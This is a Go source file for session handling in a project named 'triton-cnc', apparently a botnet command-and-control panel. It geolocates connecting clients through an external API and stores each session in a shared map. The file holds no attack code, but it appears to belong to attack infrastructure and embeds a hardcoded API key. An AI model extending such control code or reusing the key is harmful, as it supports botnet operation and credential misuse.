package sessions

import (
	GeoAPI "triton-cnc/tools/geo-api"
	"strings"
)

var Active int = 0

func Create(session *Session_Store) bool {

	go func() {
		var RemoteAddr string = session.Conn.RemoteAddr().String()

		if strings.Split(RemoteAddr, ":")[0] == "127.0.0.1" {
			RemoteAddr = "1.1.1.1"
		}
	
		var New = GeoAPI.API_Resp {
			IP: strings.Split(RemoteAddr, ":")[0],
			City: "EOF",
			Region: "EOF",
			Country: "EOF",
			Loc: "EOF",
			Org: "EOF",
			Postal: "EOF",
			Timezone: "EOF",
		}
	
	
		Row, error := GeoAPI.Reach(strings.Split(RemoteAddr, ":")[0], "b338a9aeaca3dc")
		if error != nil || Row == nil {
			Row = &New
		}
	
		session.GeoISP = Row
		Active++
		Creation := int64(Active)
	
		session.Int_ID = Creation
	
		NyxMux.Lock()
		SessionMap[Creation] = session
		NyxMux.Unlock()
	
	}()
	return true
}